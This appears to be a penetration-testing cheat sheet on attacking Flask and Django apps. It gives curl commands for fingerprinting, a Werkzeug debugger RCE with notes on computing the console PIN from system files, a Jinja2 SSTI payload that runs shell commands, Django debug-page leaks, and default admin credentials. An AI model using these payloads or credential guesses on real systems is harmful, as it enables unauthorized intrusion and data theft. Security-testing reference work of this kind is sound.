# Flask / Django

**What it is:** Python web frameworks. Flask is lightweight (uses Werkzeug/Jinja2), Django is full-featured. Flask debug mode (Werkzeug debugger) is an instant RCE. Jinja2 SSTI is the other primary attack vector.

**Default ports:** 5000 (Flask), 8000 (Django), 80, 443

**Vuln research:**
- [Flask/Werkzeug CVEs](https://www.cvedetails.com/product/68527/Palletsprojects-Werkzeug.html)
- [Django Security](https://docs.djangoproject.com/en/stable/releases/security/)
- [HackTricks — Flask](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/flask.html)

---


### Detect Flask/Django

Headers and debug pages reveal the framework

```bash
curl -sI http://$IP/ | grep -i server
# Werkzeug = Flask
```

---

### Werkzeug debugger RCE

Flask debug mode exposed — Interactive Python console

```bash
curl http://$IP/console
# If you see the Werkzeug debugger console:
# Enter: import os; os.popen('id').read()
# If PIN protected, calculate from /etc/passwd, /sys/class/net/eth0/address, /etc/machine-id
```

---

### Flask SSTI (Jinja2)

Server-side template injection — Test with math expressions

```bash
curl "http://$IP/search?q={{7*7}}"
# RCE:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

### Django debug mode

Exposes settings, SQL queries, and paths — Information disclosure

```bash
curl http://$IP/nonexistent_path_12345
# Debug page reveals: URL patterns, installed apps, database settings, SECRET_KEY
```

---

### Django admin panel

Default admin interface — Try common credentials

```bash
curl http://$IP/admin/
# Default: admin:admin, admin:password
```

---
